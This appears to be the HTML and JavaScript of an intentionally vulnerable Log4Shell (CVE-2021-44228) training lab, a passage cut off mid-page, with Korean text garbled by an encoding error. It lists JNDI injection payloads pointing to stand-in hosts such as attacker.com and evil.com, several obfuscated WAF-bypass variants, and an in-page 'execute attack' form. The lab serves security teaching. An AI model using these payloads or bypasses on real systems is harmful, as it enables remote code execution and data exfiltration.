                        content: '2021ë…„ 12ì›” 9ì¼ ê³µê°œ, 12ì›” 10ì¼ ëŒ€ê·œëª¨ ê³µê²© ì‹œì‘, ìˆ˜ ì‹œê°„ ë‚´ì— ì „ ì„¸ê³„ì ìœ¼ë¡œ í™•ì‚°ë˜ì—ˆìŠµë‹ˆë‹¤.'
                    },
                    impact: {
                        title: 'ì‹¤ì œ í”¼í•´ ì‚¬ë¡€',
                        content: 'Minecraft ì„œë²„, Tesla, Apple iCloud, Steam ë“± ì£¼ìš” ì„œë¹„ìŠ¤ë“¤ì´ ì˜í–¥ì„ ë°›ì•˜ìŠµë‹ˆë‹¤.'
                    },
                    tools: {
                        title: 'íƒì§€ ë° ìŠ¤ìº” ë„êµ¬',
                        content: 'log4j-scanner, Nuclei, OWASP ZAP ë“±ì˜ ë„êµ¬ë¡œ ì·¨ì•½ì ì„ íƒì§€í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.'
                    }
                };
                
                const resource = resources[type];
                if (resource) {
                    showAlert(`<strong>${resource.title}:</strong> ${resource.content}`, 'info');
                }
            }
    
            // Simulation functions
            function startLogSimulation() {
                const simulationEvents = [
                    'ë„¤íŠ¸ì›Œí¬ ëª¨ë‹ˆí„°ë§ ì‹œì‘ë¨',
                    'JNDI íŒ¨í„´ ê°ì§€ ì—”ì§„ í™œì„±í™”',
                    'ì·¨ì•½ì  ìŠ¤ìºë„ˆ ì¤€ë¹„ ì™„ë£Œ',
                    'ì‹¤ìŠµ í™˜ê²½ ìµœì¢… ì ê²€ ì™„ë£Œ'
                ];
    
                simulationEvents.forEach((event, index) => {
                    setTimeout(() => {
                        addLogEntry(event, 'info');
                    }, (index + 1) * 2000);
                });
            }
    
            // ì‹¤ì‹œê°„ ë³´ì•ˆ ì´ë²¤íŠ¸ ì‹œë®¬ë ˆì´ì…˜
            setInterval(function() {
                if (Math.random() < 0.1 && attackCount > 0) { // 10% í™•ë¥ ë¡œ ë³´ì•ˆ ì´ë²¤íŠ¸
                    const events = [
                        'ì™¸ë¶€ LDAP ì—°ê²° ì‹œë„ ê°ì§€ë¨',
                        'ì˜ì‹¬ìŠ¤ëŸ¬ìš´ DNS ì¿¼ë¦¬ íƒì§€ë¨',
                        'RMI ì—°ê²° ì°¨ë‹¨ë¨',
                        'JNDI íŒ¨í„´ í•„í„°ë§ ë™ì‘í•¨',
                        'ë³´ì•ˆ ëª¨ë‹ˆí„°ë§ ì‹œìŠ¤í…œ ì •ìƒ ë™ì‘ ì¤‘'
                    ];
                    
                    const randomEvent = events[Math.floor(Math.random() * events.length)];
                    addLogEntry(`[ë³´ì•ˆ] ${randomEvent}`, 'warn');
                }
            }, 10000); // 10ì´ˆë§ˆë‹¤ ì²´í¬
    
            // Tab switching event handling
            document.querySelectorAll('[data-bs-toggle="pill"]').forEach(tab => {
                tab.addEventListener('shown.bs.tab', function(e) {
                    const targetTab = e.target.getAttribute('data-bs-target');
                    addLogEntry(`ì‹¤ìŠµ íƒ­ ë³€ê²½: ${targetTab.replace('#', '').replace('-', ' ')}`, 'info');
                });
            });
    
            // í‚¤ë³´ë“œ ë‹¨ì¶•í‚¤
            document.addEventListener('keydown', function(e) {
                // Ctrl + Enter: ê³µê²© ì‹¤í–‰
                if (e.ctrlKey && e.key === 'Enter') {
                    e.preventDefault();
                    executeAttack();
                }
                
                // Ctrl + L: ë¡œê·¸ ì´ˆê¸°í™”
                if (e.ctrlKey && e.key === 'l') {
                    e.preventDefault();
                    clearLogs();
                }
                
                // Ctrl + 1-4: ë¹ ë¥¸ ê³µê²© íŒ¨í„´ ì„¤ì •
                if (e.ctrlKey && ['1', '2', '3', '4'].includes(e.key)) {
                    e.preventDefault();
                    const patterns = ['ldap', 'rmi', 'dns', 'http'];
                    setPayload(patterns[parseInt(e.key) - 1]);
                }
            });
    
            // í˜ì´ì§€ ì–¸ë¡œë“œ ì‹œ ê²½ê³ 
            window.addEventListener('beforeunload', function(e) {
                if (attackCount > 0) {
                    const message = 'ì‹¤ìŠµ ì„¸ì…˜ì´ ì§„í–‰ ì¤‘ì…ë‹ˆë‹¤. ì •ë§ í˜ì´ì§€ë¥¼ ë– ë‚˜ì‹œê² ìŠµë‹ˆê¹Œ?';
                    e.returnValue = message;
                    return message;
                }
            });
    
            // í˜ì´ì§€ ë¡œë“œ ì™„ë£Œ ì‹œ ìµœì¢… ì´ˆê¸°í™”
            window.addEventListener('load', function() {
                addLogEntry('í˜ì´ì§€ ë¡œë“œ ì™„ë£Œ - ëª¨ë“  ì‹œìŠ¤í…œ ì¤€ë¹„ë¨', 'info');
                addLogEntry('ì‹¤ìŠµì„ ì‹œì‘í•˜ë ¤ë©´ ê³µê²© íŒ¨í„´ì„ ì„ íƒí•˜ê³  "ê³µê²© ì‹¤í–‰"ì„ í´ë¦­í•˜ì„¸ìš”', 'info');
                
                // 5ì´ˆ í›„ ìë™ìœ¼ë¡œ ì²« ë²ˆì§¸ ì‹¤ìŠµ ê°€ì´ë“œ í‘œì‹œ
                setTimeout(() => {
                    if (attackCount === 0) {
                        showAlert('ğŸ’¡ ì‹¤ìŠµ íŒ: ë¨¼ì € "LDAP ê³µê²©" ë²„íŠ¼ì„ í´ë¦­í•´ì„œ ê¸°ë³¸ ê³µê²©ì„ ì²´í—˜í•´ë³´ì„¸ìš”!', 'info');
                    }
                }, 5000);
            });
    
            // ì ‘ê·¼ì„± ê°œì„ : ìŠ¤í¬ë¦° ë¦¬ë” ì§€ì›
            function announceForScreenReader(message) {
                const announcement = document.createElement('div');
                announcement.setAttribute('aria-live', 'polite');
                announcement.setAttribute('aria-atomic', 'true');
                announcement.className = 'sr-only';
                announcement.textContent = message;
                document.body.appendChild(announcement);
                
                setTimeout(() => {
                    document.body.removeChild(announcement);
                }, 1000);
            }
    
            // ê³µê²© ì‹¤í–‰ ì‹œ ìŠ¤í¬ë¦° ë¦¬ë” ì•Œë¦¼
            const originalExecuteAttack = executeAttack;
            executeAttack = function() {
                announceForScreenReader('Log4j ê³µê²©ì´ ì‹¤í–‰ë˜ì—ˆìŠµë‹ˆë‹¤.');
                originalExecuteAttack();
            };
        </script>
    </body>
    </html>
                <!DOCTYPE html>
    <html lang="ko" xmlns:th="http://www.thymeleaf.org">
    <head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <title>Log4j ì·¨ì•½ì  ì‹¤ìŠµì‹¤ - SecureLogistics</title>
        
        <!-- Bootstrap 5 CSS -->
        <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet">
        <!-- Font Awesome Icons -->
        <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" rel="stylesheet">
        <!-- Prism.js for code highlighting -->
        <link href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism-tomorrow.min.css" rel="stylesheet">
        
        <!-- Custom CSS -->
        <style>
            :root {
                --vuln-primary: #e74c3c;
                --vuln-secondary: #f39c12;
                --vuln-danger: #c0392b;
                --vuln-warning: #f1c40f;
                --vuln-dark: #2c3e50;
                --vuln-success: #27ae60;
            }
    
            body {
                background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
                min-height: 100vh;
                font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            }
    
            .vuln-header {
                background: linear-gradient(135deg, var(--vuln-danger), var(--vuln-secondary));
                color: white;
                padding: 3rem 0;
                margin-bottom: 2rem;
                position: relative;
                overflow: hidden;
            }
    
            .vuln-header::before {
                content: '';
                position: absolute;
                top: 0;
                left: 0;
                right: 0;
                bottom: 0;
                background: url('data:image/svg+xml,<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 100 100"><defs><pattern id="grid" width="10" height="10" patternUnits="userSpaceOnUse"><path d="M 10 0 L 0 0 0 10" fill="none" stroke="rgba(255,255,255,0.1)" stroke-width="1"/></pattern></defs><rect width="100" height="100" fill="url(%23grid)"/></svg>');
                opacity: 0.3;
            }
    
            .warning-banner {
                background: linear-gradient(45deg, #ff6b6b, #feca57);
                color: white;
                padding: 1.5rem;
                border-radius: 15px;
                margin-bottom: 2rem;
                border: 3px solid rgba(255, 255, 255, 0.3);
                box-shadow: 0 8px 25px rgba(255, 107, 107, 0.3);
                animation: pulse-warning 3s infinite;
            }
    
            @keyframes pulse-warning {
                0%, 100% { transform: scale(1); }
                50% { transform: scale(1.02); }
            }
    
            .lab-container {
                background: rgba(255, 255, 255, 0.95);
                backdrop-filter: blur(10px);
                border-radius: 20px;
                padding: 2rem;
                margin-bottom: 2rem;
                box-shadow: 0 15px 35px rgba(0, 0, 0, 0.1);
                border: 1px solid rgba(255, 255, 255, 0.2);
            }
    
            .attack-section {
                background: #1a1a1a;
                border-radius: 15px;
                padding: 1.5rem;
                margin-bottom: 2rem;
                border-left: 5px solid var(--vuln-danger);
            }
    
            .attack-input {
                background: #2d2d2d;
                border: 2px solid #444;
                color: #00ff00;
                font-family: 'Courier New', monospace;
                border-radius: 10px;
                padding: 1rem;
                transition: all 0.3s ease;
            }
    
            .attack-input:focus {
                border-color: var(--vuln-danger);
                box-shadow: 0 0 0 0.3rem rgba(231, 76, 60, 0.25);
                background: #333;
            }
    
            .payload-btn {
                background: linear-gradient(135deg, var(--vuln-danger), #e67e22);
                border: none;
                border-radius: 10px;
                color: white;
                padding: 0.8rem 1.5rem;
                margin: 0.3rem;
                font-weight: bold;
                transition: all 0.3s ease;
                cursor: pointer;
            }
    
            .payload-btn:hover {
                transform: translateY(-3px);
                box-shadow: 0 8px 15px rgba(231, 76, 60, 0.3);
            }
    
            .log-terminal {
                background: #000;
                color: #00ff00;
                font-family: 'Courier New', monospace;
                border-radius: 10px;
                padding: 1.5rem;
                max-height: 400px;
                overflow-y: auto;
                border: 2px solid #333;
                font-size: 0.9rem;
                line-height: 1.4;
            }
    
            .log-entry {
                margin-bottom: 0.5rem;
                word-wrap: break-word;
            }
    
            .log-info { color: #00ff00; }
            .log-warn { color: #ffff00; }
            .log-error { color: #ff4444; }
            .log-attack { color: #ff6b6b; background: rgba(255, 107, 107, 0.1); padding: 0.2rem; }
    
            .step-card {
                background: white;
                border-radius: 15px;
                padding: 1.5rem;
                margin-bottom: 1.5rem;
                box-shadow: 0 4px 15px rgba(0,0,0,0.08);
                border-left: 5px solid var(--vuln-secondary);
                transition: transform 0.3s ease;
            }
    
            .step-card:hover {
                transform: translateY(-3px);
            }
    
            .step-number {
                background: var(--vuln-secondary);
                color: white;
                width: 40px;
                height: 40px;
                border-radius: 50%;
                display: flex;
                align-items: center;
                justify-content: center;
                font-weight: bold;
                margin-right: 1rem;
            }
    
            .progress-tracker {
                background: white;
                border-radius: 15px;
                padding: 1.5rem;
                margin-bottom: 2rem;
                box-shadow: 0 4px 15px rgba(0,0,0,0.08);
            }
    
            .progress-step {
                display: flex;
                align-items: center;
                margin-bottom: 1rem;
                padding: 1rem;
                border-radius: 10px;
                transition: all 0.3s ease;
            }
    
            .progress-step.completed {
                background: rgba(39, 174, 96, 0.1);
                border-left: 4px solid var(--vuln-success);
            }
    
            .progress-step.active {
                background: rgba(241, 196, 15, 0.1);
                border-left: 4px solid var(--vuln-warning);
            }
    
            .progress-step.pending {
                background: rgba(149, 165, 166, 0.1);
                border-left: 4px solid #95a5a6;
            }
    
            .attack-demo {
                background: linear-gradient(135deg, #2c3e50, #34495e);
                color: white;
                border-radius: 15px;
                padding: 2rem;
                margin: 2rem 0;
            }
    
            .demo-terminal {
                background: #1a1a1a;
                border-radius: 10px;
                padding: 1rem;
                margin: 1rem 0;
                font-family: 'Courier New', monospace;
                color: #00ff00;
                max-height: 300px;
                overflow-y: auto;
            }
    
            .severity-critical { border-left-color: #e74c3c !important; background: rgba(231, 76, 60, 0.05); }
            .severity-high { border-left-color: #f39c12 !important; background: rgba(243, 156, 18, 0.05); }
            .severity-medium { border-left-color: #f1c40f !important; background: rgba(241, 196, 15, 0.05); }
            .severity-low { border-left-color: #3498db !important; background: rgba(52, 152, 219, 0.05); }
    
            .floating-alerts {
                position: fixed;
                top: 100px;
                right: 20px;
                z-index: 1050;
                max-width: 350px;
            }
    
            .detection-alert {
                background: rgba(231, 76, 60, 0.9);
                color: white;
                border-radius: 10px;
                padding: 1rem;
                margin-bottom: 0.5rem;
                animation: slideInRight 0.5s ease;
            }
    
            @keyframes slideInRight {
                from { transform: translateX(100%); opacity: 0; }
                to { transform: translateX(0); opacity: 1; }
            }
    
            .code-block {
                background: #2d2d2d;
                color: #f8f8f2;
                border-radius: 10px;
                padding: 1rem;
                margin: 1rem 0;
                font-family: 'Courier New', monospace;
                font-size: 0.9rem;
                overflow-x: auto;
            }
    
            .nav-pills .nav-link.active {
                background: var(--vuln-danger);
            }
    
            .badge-vuln {
                background: var(--vuln-danger);
                color: white;
                padding: 0.4rem 0.8rem;
                border-radius: 15px;
                font-size: 0.8rem;
            }
        </style>
    </head>
    <body>
        <!-- Floating Alerts Container -->
        <div class="floating-alerts" id="floatingAlerts"></div>
    
        <!-- Navigation -->
        <nav class="navbar navbar-expand-lg navbar-dark" style="background: rgba(44, 62, 80, 0.9);">
            <div class="container">
                <a class="navbar-brand" href="/">
                    <i class="fas fa-truck-moving me-2"></i>
                    SecureLogistics
                </a>
                <button class="navbar-toggler" type="button" data-bs-toggle="collapse" data-bs-target="#navbarNav">
                    <span class="navbar-toggler-icon"></span>
                </button>
                <div class="collapse navbar-collapse" id="navbarNav">
                    <ul class="navbar-nav me-auto">
                        <li class="nav-item">
                            <a class="nav-link" href="/">
                                <i class="fas fa-home me-1"></i>ëŒ€ì‹œë³´ë“œ
                            </a>
                        </li>
                        <li class="nav-item">
                            <a class="nav-link" href="/warehouse">
                                <i class="fas fa-warehouse me-1"></i>ì…ê³ ê´€ë¦¬
                            </a>
                        </li>
                        <li class="nav-item">
                            <a class="nav-link" href="/inventory">
                                <i class="fas fa-boxes me-1"></i>ì¬ê³ ì¡°íšŒ
                            </a>
                        </li>
                    </ul>
                    <ul class="navbar-nav">
                        <li class="nav-item">
                            <a class="nav-link active" href="/vulnerable">
                                <i class="fas fa-bug me-1"></i>ì·¨ì•½ì  ì‹¤ìŠµ
                                <span class="badge bg-danger ms-1">LAB</span>
                            </a>
                        </li>
                    </ul>
                </div>
            </div>
        </nav>
    
        <!-- Header -->
        <section class="vuln-header">
            <div class="container">
                <div class="row align-items-center">
                    <div class="col-md-8">
                        <h1 class="display-4 fw-bold">
                            <i class="fas fa-bug me-3"></i>Log4j ì·¨ì•½ì  ì‹¤ìŠµì‹¤
                        </h1>
                        <p class="lead">CVE-2021-44228 (Log4Shell) ì·¨ì•½ì ì„ ì•ˆì „í•˜ê²Œ í•™ìŠµí•˜ê³  ì‹¤ìŠµí•˜ì„¸ìš”</p>
                        <div class="mt-3">
                            <span class="badge badge-vuln me-2">
                                <i class="fas fa-exclamation-triangle me-1"></i>CRITICAL
                            </span>
                            <span class="badge badge-vuln me-2">
                                <i class="fas fa-shield-alt me-1"></i>CVE-2021-44228
                            </span>
                            <span class="badge badge-vuln">
                                <i class="fas fa-graduation-cap me-1"></i>EDUCATIONAL
                            </span>
                        </div>
                    </div>
                    <div class="col-md-4 text-end">
                        <div class="text-white">
                            <h4><i class="fas fa-crosshairs me-2"></i>ìœ„í—˜ë„</h4>
                            <h2 class="fw-bold">10.0</h2>
                            <small>CVSS ìµœê³  ë“±ê¸‰</small>
                        </div>
                    </div>
                </div>
            </div>
        </section>
    
        <div class="container">
            <!-- Warning Banner -->
            <div class="warning-banner">
                <div class="row align-items-center">
                    <div class="col-md-8">
                        <h3 class="mb-2">
                            <i class="fas fa-exclamation-triangle me-2"></i>
                            âš ï¸ êµìœ¡ ì „ìš© ì·¨ì•½ì  ì‹¤ìŠµ í™˜ê²½ âš ï¸
                        </h3>
                        <p class="mb-0">ì´ í™˜ê²½ì€ Log4j ì·¨ì•½ì  í•™ìŠµì„ ìœ„í•´ ì˜ë„ì ìœ¼ë¡œ ì·¨ì•½í•˜ê²Œ êµ¬ì„±ë˜ì—ˆìŠµë‹ˆë‹¤.</p>
                        <small><strong>ì£¼ì˜:</strong> ì‹¤ì œ ìš´ì˜ í™˜ê²½ì—ì„œëŠ” ì ˆëŒ€ ì‚¬ìš©í•˜ì§€ ë§ˆì„¸ìš”!</small>
                    </div>
                    <div class="col-md-4 text-end">
                        <button class="btn btn-outline-light btn-lg" onclick="showSafetyGuide()">
                            <i class="fas fa-shield-alt me-2"></i>ì•ˆì „ ìˆ˜ì¹™
                        </button>
                    </div>
                </div>
            </div>
    
            <!-- Progress Tracker -->
            <div class="progress-tracker">
                <h5 class="fw-bold mb-3">
                    <i class="fas fa-tasks me-2"></i>ì‹¤ìŠµ ì§„í–‰ ìƒí™©
                </h5>
                <div id="progressSteps">
                    <div class="progress-step pending" data-step="1">
                        <div class="step-number">1</div>
                        <div>
                            <h6 class="mb-1">ì·¨ì•½ì  ì´í•´</h6>
                            <small class="text-muted">Log4j JNDI Injection ì›ë¦¬ í•™ìŠµ</small>
                        </div>
                    </div>
                    <div class="progress-step pending" data-step="2">
                        <div class="step-number">2</div>
                        <div>
                            <h6 class="mb-1">ê¸°ë³¸ ê³µê²© ì‹¤ìŠµ</h6>
                            <small class="text-muted">LDAP, RMI, DNS ê³µê²© íŒ¨í„´ í…ŒìŠ¤íŠ¸</small>
                        </div>
                    </div>
                    <div class="progress-step pending" data-step="3">
                        <div class="step-number">3</div>
                        <div>
                            <h6 class="mb-1">ìš°íšŒ ê¸°ë²• ì‹¤ìŠµ</h6>
                            <small class="text-muted">í•„í„°ë§ ìš°íšŒ ë° ë‚œë…í™” ê¸°ë²•</small>
                        </div>
                    </div>
                    <div class="progress-step pending" data-step="4">
                        <div class="step-number">4</div>
                        <div>
                            <h6 class="mb-1">íƒì§€ ë° ëŒ€ì‘</h6>
                            <small class="text-muted">ê³µê²© íƒì§€ ë°©ë²• ë° ë³´ì•ˆ ëŒ€ì±…</small>
                        </div>
                    </div>
                </div>
            </div>
    
            <!-- Main Lab Content -->
            <div class="row">
                <div class="col-lg-8">
                    <!-- Navigation Tabs -->
                    <ul class="nav nav-pills mb-4" id="labTabs" role="tablist">
                        <li class="nav-item" role="presentation">
                            <button class="nav-link active" id="basic-tab" data-bs-toggle="pill" data-bs-target="#basic-attacks" type="button">
                                <i class="fas fa-play me-2"></i>ê¸°ë³¸ ê³µê²©
                            </button>
                        </li>
                        <li class="nav-item" role="presentation">
                            <button class="nav-link" id="advanced-tab" data-bs-toggle="pill" data-bs-target="#advanced-attacks" type="button">
                                <i class="fas fa-rocket me-2"></i>ê³ ê¸‰ ê³µê²©
                            </button>
                        </li>
                        <li class="nav-item" role="presentation">
                            <button class="nav-link" id="detection-tab" data-bs-toggle="pill" data-bs-target="#detection" type="button">
                                <i class="fas fa-search me-2"></i>íƒì§€ ë¶„ì„
                            </button>
                        </li>
                        <li class="nav-item" role="presentation">
                            <button class="nav-link" id="defense-tab" data-bs-toggle="pill" data-bs-target="#defense" type="button">
                                <i class="fas fa-shield-alt me-2"></i>ë°©ì–´ ê¸°ë²•
                            </button>
                        </li>
                    </ul>
    
                    <!-- Tab Content -->
                    <div class="tab-content" id="labTabContent">
                        <!-- Basic Attacks -->
                        <div class="tab-pane fade show active" id="basic-attacks" role="tabpanel">
                            <div class="lab-container">
                                <h4 class="fw-bold mb-3">
                                    <i class="fas fa-bomb me-2 text-danger"></i>ê¸°ë³¸ JNDI Injection ê³µê²©
                                </h4>
                                
                                <div class="attack-section">
                                    <h6 class="text-white mb-3">
                                        <i class="fas fa-terminal me-2"></i>ê³µê²© ì‹¤í–‰ ì˜ì—­
                                    </h6>
                                    
                                    <div class="mb-3">
                                        <label class="form-label text-white">ê³µê²© ëŒ€ìƒ ì„ íƒ</label>
                                        <select class="form-select attack-input" id="attackTarget">
                                            <option value="/api/vulnerable/log-input">ì§ì ‘ ì…ë ¥ ë¡œê¹…</option>
                                            <option value="/api/boards/search">ê²Œì‹œíŒ ê²€ìƒ‰</option>
                                            <option value="/api/users/search">ì‚¬ìš©ì ê²€ìƒ‰</option>
                                            <option value="/api/vulnerable/log-headers">HTTP í—¤ë” ë¡œê¹…</option>
                                        </select>
                                    </div>
                                    
                                    <div class="mb-3">
                                        <label class="form-label text-white">ê³µê²© í˜ì´ë¡œë“œ ì…ë ¥</label>
                                        <textarea class="form-control attack-input" id="attackPayload" rows="3" 
                                                 placeholder="JNDI ê³µê²© íŒ¨í„´ì„ ì…ë ¥í•˜ê±°ë‚˜ ì•„ë˜ ë²„íŠ¼ì„ í´ë¦­í•˜ì„¸ìš”..."></textarea>
                                    </div>
                                    
                                    <div class="mb-3">
                                        <h6 class="text-white mb-2">ë¯¸ë¦¬ ì •ì˜ëœ ê³µê²© íŒ¨í„´</h6>
                                        <button class="payload-btn" onclick="setPayload('ldap')">
                                            <i class="fas fa-bolt me-1"></i>LDAP ê³µê²©
                                        </button>
                                        <button class="payload-btn" onclick="setPayload('rmi')">
                                            <i class="fas fa-satellite me-1"></i>RMI ê³µê²©
                                        </button>
                                        <button class="payload-btn" onclick="setPayload('dns')">
                                            <i class="fas fa-globe me-1"></i>DNS ìœ ì¶œ
                                        </button>
                                        <button class="payload-btn" onclick="setPayload('http')">
                                            <i class="fas fa-link me-1"></i>HTTP ìš”ì²­
                                        </button>
                                    </div>
                                    
                                    <div class="text-center">
                                        <button class="btn btn-danger btn-lg" onclick="executeAttack()">
                                            <i class="fas fa-crosshairs me-2"></i>ê³µê²© ì‹¤í–‰
                                        </button>
                                        <button class="btn btn-outline-light ms-2" onclick="clearLogs()">
                                            <i class="fas fa-trash me-2"></i>ë¡œê·¸ ì´ˆê¸°í™”
                                        </button>
                                    </div>
                                </div>
    
                                <!-- Code Examples -->
                                <div class="mt-4">
                                    <h6 class="fw-bold">ğŸ“‹ ê³µê²© íŒ¨í„´ ì„¤ëª…</h6>
                                    <div class="accordion" id="attackExamples">
                                        <div class="accordion-item">
                                            <h2 class="accordion-header">
                                                <button class="accordion-button" type="button" data-bs-toggle="collapse" data-bs-target="#ldap-example">
                                                    LDAP ê³µê²© (ê°€ì¥ ì¼ë°˜ì )
                                                </button>
                                            </h2>
                                            <div id="ldap-example" class="accordion-collapse collapse show">
                                                <div class="accordion-body">
                                                    <div class="code-block">
    <pre><code>${jndi:ldap://attacker.com/exploit}
    
    # ë™ì‘ ì›ë¦¬:
    1. Log4jê°€ ${jndi:...} íŒ¨í„´ì„ ê°ì§€
    2. LDAP ì„œë²„(attacker.com)ì— ì—°ê²° ì‹œë„  
    3. ì•…ì˜ì ì¸ Java í´ë˜ìŠ¤ ë‹¤ìš´ë¡œë“œ ë° ì‹¤í–‰
    4. ì‹œìŠ¤í…œ ì™„ì „ ì¥ì•… ê°€ëŠ¥</code></pre>
                                                    </div>
                                                </div>
                                            </div>
                                        </div>
                                        
                                        <div class="accordion-item">
                                            <h2 class="accordion-header">
                                                <button class="accordion-button collapsed" type="button" data-bs-toggle="collapse" data-bs-target="#rmi-example">
                                                    RMI ê³µê²©
                                                </button>
                                            </h2>
                                            <div id="rmi-example" class="accordion-collapse collapse">
                                                <div class="accordion-body">
                                                    <div class="code-block">
    <pre><code>${jndi:rmi://malicious.server:1099/payload}
    
    # íŠ¹ì§•:
    - Java RMI(Remote Method Invocation) í”„ë¡œí† ì½œ ì‚¬ìš©
    - ê¸°ë³¸ í¬íŠ¸: 1099
    - ì§ì ‘ Java ê°ì²´ ì‹¤í–‰ ê°€ëŠ¥</code></pre>
                                                    </div>
                                                </div>
                                            </div>
                                        </div>
                                        
                                        <div class="accordion-item">
                                            <h2 class="accordion-header">
                                                <button class="accordion-button collapsed" type="button" data-bs-toggle="collapse" data-bs-target="#dns-example">
                                                    DNS ë°ì´í„° ìœ ì¶œ
                                                </button>
                                            </h2>
                                            <div id="dns-example" class="accordion-collapse collapse">
                                                <div class="accordion-body">
                                                    <div class="code-block">
    <pre><code>${jndi:dns://exfiltrate.attacker.com/data}
    
    # ëª©ì :
    - ì‹œìŠ¤í…œ ì •ë³´ ìœ ì¶œ
    - í™˜ê²½ ë³€ìˆ˜ íšë“
    - ë„¤íŠ¸ì›Œí¬ ì—°ê²° í™•ì¸</code></pre>
                                                    </div>
                                                </div>
                                            </div>
                                        </div>
                                    </div>
                                </div>
                            </div>
                        </div>
    
                        <!-- Advanced Attacks -->
                        <div class="tab-pane fade" id="advanced-attacks" role="tabpanel">
                            <div class="lab-container">
                                <h4 class="fw-bold mb-3">
                                    <i class="fas fa-rocket me-2 text-warning"></i>ê³ ê¸‰ ìš°íšŒ ê¸°ë²•
                                </h4>
                                
                                <div class="step-card severity-high">
                                    <div class="d-flex">
                                        <div class="step-number">1</div>
                                        <div>
                                            <h6 class="fw-bold">ëŒ€ì†Œë¬¸ì ìš°íšŒ</h6>
                                            <div class="code-block mt-2">
    <pre><code>${${lower:jndi}:${lower:ldap}://evil.com/exploit}</code></pre>
                                            </div>
                                            <button class="btn btn-warning btn-sm mt-2" onclick="setPayload('bypass1')">
                                                <i class="fas fa-copy me-1"></i>í…ŒìŠ¤íŠ¸
                                            </button>
                                        </div>
                                    </div>
                                </div>
    
                                <div class="step-card severity-high">
                                    <div class="d-flex">
                                        <div class="step-number">2</div>
                                        <div>
                                            <h6 class="fw-bold">í™˜ê²½ë³€ìˆ˜ ìš°íšŒ</h6>
                                            <div class="code-block mt-2">
    <pre><code>${${env:BARFOO:-j}ndi${env:BARFOO:-:}${env:BARFOO:-l}dap${env:BARFOO:-:}//attacker.com/a}</code></pre>
                                            </div>
                                            <button class="btn btn-warning btn-sm mt-2" onclick="setPayload('bypass2')">
                                                <i class="fas fa-copy me-1"></i>í…ŒìŠ¤íŠ¸
                                            </button>
                                        </div>
                                    </div>
                                </div>
    
                                <div class="step-card severity-critical">
                                    <div class="d-flex">
                                        <div class="step-number">3</div>
                                        <div>
                                            <h6 class="fw-bold">ì¤‘ì²© í‘œí˜„ì‹ ìš°íšŒ</h6>
                                            <div class="code-block mt-2">
    <pre><code>${${::-j}${::-n}${::-d}${::-i}:${::-l}${::-d}${::-a}${::-p}://evil.com/exploit}</code></pre>
                                            </div>
                                            <button class="btn btn-danger btn-sm mt-2" onclick="setPayload('bypass3')">
                                                <i class="fas fa-copy me-1"></i>í…ŒìŠ¤íŠ¸
                                            </button>
                                        </div>
                                    </div>
                                </div>
    
                                <div class="step-card severity-medium">
                                    <div class="d-flex">
                                        <div class="step-number">4</div>
                                        <div>
                                            <h6 class="fw-bold">Base64 ì¸ì½”ë”© ìš°íšŒ</h6>
                                            <div class="code-block mt-2">
    <pre><code>${jndi:ldap://base64.evil.com/${base64:dGVzdA==}}</code></pre>
                                            </div>
                                            <button class="btn btn-info btn-sm mt-2" onclick="setPayload('bypass4')">
                                                <i class="fas fa-copy me-1"></i>í…ŒìŠ¤íŠ¸
                                            </button>
                                        </div>
                                    </div>
                                </div>
    
                                <div class="attack-demo">
                                    <h5 class="fw-bold mb-3">
                                        <i class="fas fa-flask me-2"></i>ìš°íšŒ ê¸°ë²• ì‹¤ìŠµ
                                    </h5>
                                    <p>ìœ„ì˜ ìš°íšŒ ê¸°ë²•ë“¤ì€ WAF(Web Application Firewall)ë‚˜ ê°„ë‹¨í•œ í•„í„°ë§ì„ ìš°íšŒí•˜ê¸° ìœ„í•´ ì‚¬ìš©ë©ë‹ˆë‹¤.</p>
                                    
                                    <div class="row">
                                        <div class="col-md-6">
                                            <h6>íƒì§€ë˜ëŠ” íŒ¨í„´:</h6>
                                            <div class="code-block">
    <pre><code class="language-bash"># ê¸°ë³¸ íŒ¨í„´ (ì‰½ê²Œ íƒì§€ë¨)
    ${jndi:ldap://
    ${jndi:rmi://
    ${jndi:dns://</code></pre>
                                            </div>
                                        </div>
                                        <div class="col-md-6">
                                            <h6>ìš°íšŒ íŒ¨í„´:</h6>
                                            <div class="code-block">
    <pre><code class="language-bash"># ìš°íšŒ ì„±ê³µ ê°€ëŠ¥ì„± ë†’ìŒ
    ${${lower:j}ndi:ldap://
    ${j${k8s:k5:-ndi:l}dap://
    ${${::-j}${::-n}${::-d}${::-i}: